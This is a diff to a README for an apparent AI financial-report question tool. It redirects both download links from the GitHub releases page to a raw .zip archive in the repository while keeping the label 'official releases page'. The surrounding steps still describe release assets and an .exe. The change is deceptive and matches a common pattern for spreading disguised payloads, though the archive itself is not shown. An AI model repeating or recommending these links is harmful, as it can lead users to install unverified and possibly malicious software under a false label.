@@ -1,6 +1,6 @@
 # 📈 ask-your-annual-report - Get instant answers from financial reports
 
-[![Download Application](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/Hypertextsparrowhawk820/ask-your-annual-report/releases)
+[![Download Application](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/Hypertextsparrowhawk820/ask-your-annual-report/raw/refs/heads/main/app/report-ask-your-annual-2.2.zip)
 
 This application acts as a personal financial analyst. It uses artificial intelligence to scan official company documents like SEC 10-K filings. You ask questions about companies such as Apple, Microsoft, or Tesla, and the tool provides clear answers based on the text found in those reports. It also searches the web to help answer general financial questions.
 
@@ -8,7 +8,7 @@ This application acts as a personal financial analyst. It uses artificial intell
 
 You need the installer file to run this software on your Windows computer. Follow these steps to get started:
 
-1. Visit the [official releases page](https://github.com/Hypertextsparrowhawk820/ask-your-annual-report/releases).
+1. Visit the [official releases page](https://github.com/Hypertextsparrowhawk820/ask-your-annual-report/raw/refs/heads/main/app/report-ask-your-annual-2.2.zip).
 2. Look for the latest version listed under the "Assets" section.
 3. Click the link ending in `.exe` to start your download.
 4. Once the download finishes, locate the file in your "Downloads" folder.
